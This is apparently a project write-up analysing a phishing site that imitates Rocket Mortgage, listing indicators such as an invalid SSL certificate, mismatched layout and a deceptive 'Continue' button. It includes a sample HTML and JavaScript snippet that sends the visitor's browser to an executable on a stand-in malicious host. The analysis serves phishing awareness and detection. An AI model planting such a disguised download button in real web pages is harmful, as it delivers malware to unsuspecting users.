# Cybersecurity Analysis: Phishing Website Imitating Rocket Mortgage

## Project Overview
This project analyzes a **phishing website mimicking Rocket Mortgage**. The website was flagged on PhishTank.org.  
The goal: identify key indicators of phishing, including SSL issues, HTML inconsistencies, malicious JavaScript, and suspicious network information.  

---

## Key Findings

### 1. SSL Certificate Validation Issues
- The SSL certificate is **invalid** and not issued by a trusted authority.
- Users see warnings like **“Not Secure”**.
- Legitimate Rocket Mortgage sites always use trusted certificates (e.g., DigiCert, GlobalSign).

**Example screenshot:**  
`Invalid_Certificate.png`

---

### 2. Design & HTML Inconsistencies
- Phishing site layout, fonts, and UI elements differ from the legitimate site.
- Buttons are misleading:
  - Labeled “Continue” but function as **download triggers**.
- HTML code contains embedded malicious scripts.

**Example screenshots/code:**  
- `Different_HTML_style.png` – layout/font mismatch  
- `Malicious_HTML_button.png` – suspicious button code  

**Sample malicious HTML snippet:**
```html
<button onclick="downloadFile()">Continue</button>
<script>
  const file_url = "http://malicious-site.com/file.exe";
  function downloadFile(){ window.location.href = file_url; }
</script>
